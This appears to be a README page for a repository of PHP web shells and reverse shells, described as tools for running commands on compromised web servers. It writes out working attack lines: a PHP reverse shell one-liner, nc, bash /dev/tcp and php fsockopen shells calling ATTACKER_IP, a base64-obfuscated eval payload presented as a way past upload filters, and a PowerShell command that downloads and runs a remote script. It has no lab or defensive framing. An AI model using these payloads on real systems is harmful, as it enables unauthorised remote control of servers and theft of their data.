<h3 align='center'><b>One-liner php reverse shell</b></h3>
 <pre><code>&lt;?php exec("/bin/bash -c 'bash -i >/dev/tcp/&lt;IP>/&lt;PORT> 0>&1'"); ?></code></pre>
<h3 align='center'><b> rev_shell.php </b></h3>
 <p>A simple python reverse shell
<h3 align='center'><b> shell_with_curl.php </b></h3> 
 <p>A simple webshell check by curl command to that file in victim url directory
<h3 align='center'><b> shell_with_param.php </b></h3> 
 <p>A simple webshell works by taking a parameter and executing it as a system command.
<h3 align='center'><b> webshell.php </b></h3>
 <p> In pseudocode, the above snippet is doing the following:
  <ol>
    <li> Checking if the parameter "commandString" is set
    <li> If it is, then the variable $command_string gets what was passed into the input field
    <li> The program then goes into a try block to execute the function passthru($command_string).  The docs on passthru() on <a href='https://www.php.net/manual/en/function.passthru.php'> PHP's website </a>, but in general, it is executing what gets entered into the input then passing the output directly back to the browser.
    <li>If the try does not succeed, output the error to page.  Generally this won't output anything because you can't output stderr but PHP doesn't let you have a try without a catch.

<h3 align='center'><b> Reverse shell command </b></h3> 
   <pre><code>nc -e /bin/bash &lt;ATTACKER_IP> &lt;ATTACKER_PORT></code></pre>
   <pre><code>bash -i >& /dev/tcp/&lt;ATTACKER_IP>/&lt;ATTACKER_PORT> 0>&1</code></pre>
   <pre><code>php -r '$sock=fsockopen("&lt;ATTACKER_IP>",&lt;ATTACKER_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>

<h3>Probably can bypass filters while upload, for example.</h3>
 <pre><code>&lt;?=eval(base64_decode('ZWNobyBzaGVsbF91eGVjKCRfR0VUWydjbWQnXS4nIDI+JjEnKTs='));?></code></pre>

<h3 align='center'><b>Commands for Windows Reverse Shell</b></h3>
 <pre><code>python3 -m http.server 80</code></pre>
 <pre><code>nc -lvnp 4444</code></pre>
 <pre><code>powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://&lt;ATTACKER_IP>/reverse.ps1'')"</code></pre>
<h3 align='center'><b>poc_executable.php</b></h3>
<p>This PHP script is a simple yet effective utility for situations where you need to execute system commands remotely on a compromised web server. It’s designed to handle specific scenarios where single-line scripts may fail due to various restrictions or server configurations.
